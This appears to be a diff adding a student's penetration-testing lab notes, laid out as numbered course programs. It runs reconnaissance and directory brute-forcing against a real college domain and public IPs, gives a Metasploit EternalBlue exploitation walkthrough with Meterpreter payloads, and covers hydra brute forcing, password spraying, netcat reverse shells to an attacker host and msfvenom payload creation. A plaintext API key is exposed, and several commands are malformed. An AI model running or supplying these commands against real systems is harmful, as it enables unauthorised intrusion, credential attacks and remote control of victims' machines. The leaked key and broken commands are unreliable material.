@@ -1,0 +1,236 @@
+Program 1: Cyber-kill chain: Reconnaissance and Information Gathering : OSINT, Breached credentials, Subdomain brute forcing, Directory scanning.
+##### The Harvester - IP Address Founder #####
+git clone https://github.com/laramies/theHarvester 
+cd theHarvester
+pip install -r requirements.txt
+theHarvester -d https://bmsit.ac.in/ -l 500 -b all
+15.197.255.128 (BMSIT Main IP)
+
+cd
+
+##### Sherlock #####
+Cd Desktop
+mkdir sherlock
+Cd sherlock
+git clone https://github.com/sherlock-project/sherlock.git  
+ls
+sherlock bmsit
+
+cd
+
+##### hunter.io #####
+curl "https://api.hunter.io/v2/domain-search?domain=amazon.in&api_key=86ffd45bb1bd22856512504f45c8f38d5e5a30cb"
+
+cd
+
+##### have I been pwned #####
+https://haveibeenpwned.com/
+
+##### Sublist3r #####
+sudo apt install sublist3r
+sublist3r -d bmsit.ac.in -o subdomain.txt
+
+##### gobuster #####
+sudo apt install gobuster
+sudo apt install dirb
+gobuster dir -u https://bmsit.ac.in -w /usr/share/wordlists/dirb/common.txt -s '200,204,301,403' -b ''
+dirb https://bmsit.ac.in
+
+##### snort #####
+sudo apt install snort
+snort --version
+appid_detector_builder.sh -h
+snort -h
+snort2lua -h
+man u2boat
+man u2spewfoo
+
+######################################################
+######################################################
+######################################################
+Program 2: Scanning and Enumeration: Scanning and exploiting open ports and services, Scanning for potential exploits in public vulnerability databases.
+#Scanning Open Ports and Services#
+sudo nmap -sV 15.197.255.128 ## Detecting Apache server in port 80
+nmap -sn 15.197.255.128 ##Basic scan on single IP
+nmap -T4 -F 15.197.255.128 ## Quick TCP scan
+nmap -sV 15.197.255.128 ##Service Enumeration
+sudo nmap -sU -p 1-1024 15.197.255.128 ##UDP port Scan
+sudo nmap -O 15.197.255.128 ## OS Detection
+nmap -T4-A-v 15.197.255.128 #Intense Scan
+
+#Enumeration of Services and Systems#
+sudo nmap -sC -sV 15.197.255.128 ##example command
+sudo nmap -O 15.197.255.128
+enum4linux 15.197.255.128 ##User Enumeration
+dnsenum 15.197.255.128 ##To know weak points
+
+#Scanning for Potential Exploits in Public Vulnerability Databases#
+searchsploit apache 2.4.29
+searchsploit Microsoft IIS 10.0
+Go to https://nvd.nist.gov/ and search for Apache Vulnerabilities
+Use tools for automation: Tools likes Nessus or OpenVAS
+
+#Exploiting Discovered Vulnerabilities#
+sudo msfconsole ##wait till search
+nmap -sV 15.197.255.128 ##Target IP - Wait till search
+use exploit/multi/samba/usermap_script ## Shows Options
+set RHOSTS 10.0.2.15 ## or 10.100.25.92 - show options
+set PAYLOAD cmd/unix/interact ## or cmd/unix/reverse
+exploit
+
+######################################################
+######################################################
+######################################################
+3rd program: Exploitation Basics : Metasploit, Gaining access to machines using vulnerabilities, Custom exploitation scripts, Password brute
+forcing, Password spraying.
+
+1. Know the target System IP address : example : 10.0.2.15
+2. Scan vulnerability from target system by scanning using Nmap
+Example : Nmap 10.0.2.15
+Try -Pn
+3. nmap 10.0.2.15 -Pn -sV
+4. sudo msfconsole
+5. search smb
+6. grep scanner search smb
+auxiliary/scanner/smb/smb_ms17_010
+7. use auxiliary/scanner/smb/smb_ms17_010
+8. show options
+9. set RHOSTS 192.168.152.191 (target ip )
+10. run
+11. search smb
+12. grep exploit search smb
+13. use exploit/windows/smb/ms17_010_psexec
+14. show options
+15. set RHOSTS 192.168.152.191 (target ip )
+16. set payload (double tap)
+17. set payload windows/meterpreter/reverse_http
+18. show options
+19. exploit
+############System hacked or login failed ####
+
+nmap 192.168.152.191
+nmap 192.168.152.191 -Pn
+nmap 192.168.152.191 -sV
+nmap 192.168.152.191 -Pn -sV
+sudo msfconsole
+search smb
+grep scanner search smb
+useInterrupt: use the 'exit' command to quit
+use auxiliary/scanner/smb/smb_ms17_010
+show options
+set RHOSTS 192.168.152.191
+RHOSTS => 192.168.152.191
+run
+search smb
+grep exploit search smb
+use exploit/windows/smb/ms17_010_psexec
+show options
+set RHOSTS 192.168.152.191
+RHOSTS => 192.168.152.191
+set payload
+set payload windows/meterpreter/reverse_http
+show options
+exploit
+
+#####Password Brute Forcing#####
+hydra -l username -P/path/to/passwords.txt ftp://target_ip
+hydra -l user -P passlist.txt ftp://192.168.0.1
+
+#####Password Spraying#####
+./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain _users.txt
+Password123
+
+
+######################################################
+######################################################
+######################################################
+5th program:Maintaining access: Reverse shell, file transfer. Web Application Penetration Testing. Automated Vulnerability scanners: Nessus, Nmap, Metasploit, Acunetix. 
+note: in windows install nmap (ncat-reverse shell)
+Environment Preparation:
+o Virtual Machines: ▪ Windows Server 2019 (Target)
+ ▪ Windows 10 (Target)
+ ▪ Kali Linux (Attacker) 
+
+#####Reverse Shell Tools: Netcat, Metasploit (Kali Linux)#####
+nc -lvnp 4444 ##Kali Linux (Attacker Machine) Command
+nc <attacker-ip> 4444 -e cmd.exe ##(or)
+ncat <attacker-ip> 4444 -e cmd.exe ##(or)
+ncat 192.168.1.10.444 -e cmd.exe ##Windows Target Machine
+
+#####Metasploit Reverse Shell#####
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <attacker-ip>
+set LPORT 4444
+run
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker-ip> LPORT=4444 -f
+exe -o payload.exe
+
+next step to execute payload.exe
+
+File Transfer with Netcat:
+• Create a File to Transfer:
+>> echo "This is a test file" > testfile.txt
+Creates a text file (testfile.txt) containing the string "This is a test file" on the attacker
+machine.
+• Start a Listener to Send the File:
+>> nc -lvnp 4444 < testfile.txt
+Initiates a Netcat listener on port 4444, sending the contents of testfile.txt to the
+target machine.
+Receive the File on the Target Machine:
+>> nc <attacker-ip> 4444 > receivedfile.txt
+Connects to the attacker's IP on port 4444 and writes the incoming data to
+receivedfile.txt on the target machine.
+
+Transfer Files Using SCP:
+>>scp testfile.txt user@<target-ip>:/path/to/destination
+
+
+#####Web Application Penetration Testing Tools: Burp Suite, OWASP ZAP (Kali Linux)#####
+burpsuite
+ls
+chmod +x burpsuite_community_linux_v2024_6_6.sh
+sudo ./burpsuite_community_linux_v2024_6_6.sh
+
+go to burpsuite in windows web applications and download and install
+
+launch burpsuite intercept reqt
+forward a reqt
+switch off inctercept
+view http history
+intercept a reqt
+
+2. OWASP ZAP:
+sudo su
+cd download
+ls
+./ZAP_2_15_0_unix.sh
+apt install zaproxy
+zaproxy
+
+in windows
+open Owasp
+in automated scan put the proxy link of bWAPP websit
+click on Attack
+
+next it scans for vulnerb
+after scanning u can see the alert and vul present
+
+#####Automated Vulnerability Scanner#####
+1. . Install Nessus: 
+/etc/init.d/nessusd start
+• Access Nessus through a web browser at https://:8834. 
+create account n login
+
+2. Advanced Scan 
+ nmap -sS -sV -O 
+
+for port scanning
+nmap -p- bmsit.ac.in
+nslookup bmsit.ac.in
+nmap 52.66.122.218
+nmap -sS -sV -0 52.66.122.218
+nmap -sV bmsit.ac.in
+nmap -p bmsit.ac.in
+
